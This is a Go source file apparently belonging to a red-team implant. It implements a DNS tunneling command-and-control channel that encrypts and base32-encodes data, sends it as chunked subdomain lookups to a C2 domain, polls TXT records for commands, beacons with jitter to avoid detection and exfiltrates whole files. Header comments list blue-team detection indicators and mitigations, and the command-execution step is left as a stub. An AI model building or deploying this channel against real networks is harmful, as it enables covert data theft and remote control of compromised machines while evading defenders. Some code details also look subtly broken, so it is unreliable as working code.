package comms

import (
	"encoding/base32"
	"encoding/hex"
	"errors"
	"fmt"
	"math/rand"
	"net"
	"strings"
	"time"
)

// DNS Covert Channel - Fallback C2 Communication
//
// BLUE TEAM DETECTION INDICATORS:
// 1. DNS: Unusually long subdomain queries (>63 characters)
// 2. DNS: High frequency of TXT record queries to single domain
// 3. DNS: Base32 encoded patterns in subdomain names
// 4. DNS: Queries to domains not in whitelist/expected patterns
// 5. Network: DNS traffic volume exceeds baseline significantly
//
// MITIGATIONS:
// - DNS query logging and analysis (Zeek, Suricata)
// - Subdomain length monitoring (flag >50 chars)
// - TXT record query rate limiting
// - DNS firewall rules blocking suspicious domains
// - Passive DNS monitoring for anomalous patterns

// DNSChannel implements DNS tunneling for C2 communications
// Uses DNS A/TXT queries to exfiltrate data and receive commands
type DNSChannel struct {
	domain       string   // C2 domain (e.g., c2.example.com)
	resolvers    []string // DNS resolvers to use
	beaconID     string
	crypto       *CryptoEngine
	maxChunkSize int // Max bytes per DNS query (typically 63 chars for subdomain)
}

// DNSBeaconConfig configuration for DNS channel
type DNSBeaconConfig struct {
	Domain       string
	Resolvers    []string
	BeaconID     string
	MaxChunkSize int
}

// NewDNSChannel creates a new DNS covert channel
func NewDNSChannel(config *DNSBeaconConfig, crypto *CryptoEngine) (*DNSChannel, error) {
	if config.Domain == "" {
		return nil, errors.New("DNS domain is required")
	}

	if config.BeaconID == "" {
		return nil, errors.New("beacon ID is required")
	}

	// Default to system DNS if no resolvers specified
	if len(config.Resolvers) == 0 {
		config.Resolvers = []string{"8.8.8.8:53", "1.1.1.1:53"}
	}

	// Default chunk size (DNS subdomain max is 63 chars)
	if config.MaxChunkSize == 0 {
		config.MaxChunkSize = 32 // Conservative size for encoding overhead
	}

	return &DNSChannel{
		domain:       config.Domain,
		resolvers:    config.Resolvers,
		beaconID:     config.BeaconID,
		crypto:       crypto,
		maxChunkSize: config.MaxChunkSize,
	}, nil
}

// SendData exfiltrates data via DNS queries
// Chunks data into multiple DNS queries if needed
//
// OPSEC: Each chunk is sent as a subdomain lookup
// Format: [chunk].[session-id].[beacon-id].[domain]
// Example: aGVsbG8ud29ybGQ.session123.beacon001.c2.example.com
func (d *DNSChannel) SendData(data []byte) error {
	// Encrypt data first
	encrypted, err := d.crypto.Encrypt(data)
	if err != nil {
		return err
	}

	// Base32 encode for DNS-safe transmission
	// Base32 is more DNS-friendly than Base64 (no case sensitivity issues)
	encoded := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString([]byte(encrypted))
	encoded = strings.ToLower(encoded) // DNS is case-insensitive

	// Generate session ID for this transmission
	sessionID := generateSessionID()

	// Split into chunks
	chunks := d.chunkData(encoded)

	// Send each chunk as a DNS query
	for i, chunk := range chunks {
		// Format: [chunk].[chunk-index].[session-id].[beacon-id].[domain]
		query := fmt.Sprintf("%s.%d.%s.%s.%s",
			chunk,
			i,
			sessionID,
			d.beaconID,
			d.domain,
		)

		// Send DNS query
		if err := d.sendDNSQuery(query); err != nil {
			return fmt.Errorf("chunk %d failed: %w", i, err)
		}

		// Small delay between chunks to avoid rate limiting
		time.Sleep(time.Duration(100+rand.Intn(200)) * time.Millisecond)
	}

	return nil
}

// ReceiveCommands polls for commands via DNS TXT records
// Commands are stored in TXT records at: [beacon-id].[domain]
//
// OPSEC: TXT records can hold 255 bytes, allowing command transmission
// Blue teams monitor TXT queries as they're less common than A records
func (d *DNSChannel) ReceiveCommands() ([]string, error) {
	// Query TXT record for beacon ID
	query := fmt.Sprintf("%s.cmd.%s", d.beaconID, d.domain)

	// Lookup TXT records
	txtRecords, err := d.lookupTXT(query)
	if err != nil {
		return nil, err
	}

	if len(txtRecords) == 0 {
		return nil, nil // No commands
	}

	var commands []string
	for _, record := range txtRecords {
		// Decode base32
		decoded, err := base32.StdEncoding.WithPadding(base32.NoPadding).DecodeString(strings.ToUpper(record))
		if err != nil {
			continue // Skip malformed records
		}

		// Decrypt command
		decrypted, err := d.crypto.Decrypt(string(decoded))
		if err != nil {
			continue
		}

		commands = append(commands, string(decrypted))
	}

	return commands, nil
}

// sendDNSQuery sends a DNS A record query to exfiltrate data
// The query itself contains the data in the subdomain
func (d *DNSChannel) sendDNSQuery(query string) error {
	// Select random resolver for load distribution
	resolver := d.resolvers[rand.Intn(len(d.resolvers))]

	// Create custom resolver
	r := &net.Resolver{
		PreferGo: true,
		Dial: func(ctx, network, address string) (net.Conn, error) {
			d := net.Dialer{
				Timeout: 5 * time.Second,
			}
			return d.Dial(network, resolver)
		},
	}

	// Perform lookup (we don't care about the result, just that the query is sent)
	_, err := r.LookupHost(nil, query)

	// Even if lookup fails, data was sent (server saw the query)
	// We ignore "no such host" errors as they're expected
	if err != nil {
		dnsErr, ok := err.(*net.DNSError)
		if ok && (dnsErr.IsNotFound || dnsErr.IsTimeout) {
			return nil // Expected error, data was still sent
		}
		return err
	}

	return nil
}

// lookupTXT queries TXT records to receive commands
func (d *DNSChannel) lookupTXT(query string) ([]string, error) {
	resolver := d.resolvers[rand.Intn(len(d.resolvers))]

	r := &net.Resolver{
		PreferGo: true,
		Dial: func(ctx, network, address string) (net.Conn, error) {
			d := net.Dialer{
				Timeout: 5 * time.Second,
			}
			return d.Dial(network, resolver)
		},
	}

	records, err := r.LookupTXT(nil, query)
	if err != nil {
		return nil, err
	}

	return records, nil
}

// chunkData splits data into DNS-safe chunks
func (d *DNSChannel) chunkData(data string) []string {
	var chunks []string

	for i := 0; i < len(data); i += d.maxChunkSize {
		end := i + d.maxChunkSize
		if end > len(data) {
			end = len(data)
		}
		chunks = append(chunks, data[i:end])
	}

	return chunks
}

// generateSessionID creates a unique session identifier
func generateSessionID() string {
	b := make([]byte, 4)
	rand.Read(b)
	return hex.EncodeToString(b)
}

// Beacon sends a periodic DNS beacon to maintain presence
// Uses a simple A record query with beacon ID
func (d *DNSChannel) Beacon() error {
	// Create beacon query: beacon.[beacon-id].[timestamp].[domain]
	timestamp := fmt.Sprintf("%x", time.Now().Unix())
	query := fmt.Sprintf("beacon.%s.%s.%s", d.beaconID, timestamp, d.domain)

	return d.sendDNSQuery(query)
}

// DNSJitterBeacon performs beaconing with jitter to avoid pattern detection
func (d *DNSChannel) DNSJitterBeacon(interval time.Duration, jitterPercent int) {
	for {
		// Calculate jittered sleep
		baseSeconds := int(interval.Seconds())
		jitterRange := baseSeconds * jitterPercent / 100
		jitter := rand.Intn(jitterRange*2) - jitterRange
		sleepDuration := time.Duration(baseSeconds+jitter) * time.Second

		time.Sleep(sleepDuration)

		// Send beacon
		if err := d.Beacon(); err != nil {
			// Silent failure - don't expose errors in DNS channel
			continue
		}

		// Check for commands
		commands, err := d.ReceiveCommands()
		if err != nil {
			continue
		}

		// Process commands
		for _, cmd := range commands {
			// Would execute command here
			_ = cmd
		}
	}
}

// ExfiltrateFile sends a file over DNS in chunks
// OPSEC WARNING: Large files over DNS are very suspicious!
// Blue teams monitor DNS exfil based on query volume
func (d *DNSChannel) ExfiltrateFile(filename string, content []byte) error {
	// Add metadata: filename
	metadata := fmt.Sprintf("FILE:%s:", filename)
	fullData := append([]byte(metadata), content...)

	return d.SendData(fullData)
}

// HealthCheck performs a simple DNS health check
// Returns true if DNS channel is operational
func (d *DNSChannel) HealthCheck() bool {
	query := fmt.Sprintf("health.%s.%s", d.beaconID, d.domain)
	err := d.sendDNSQuery(query)
	return err == nil
}
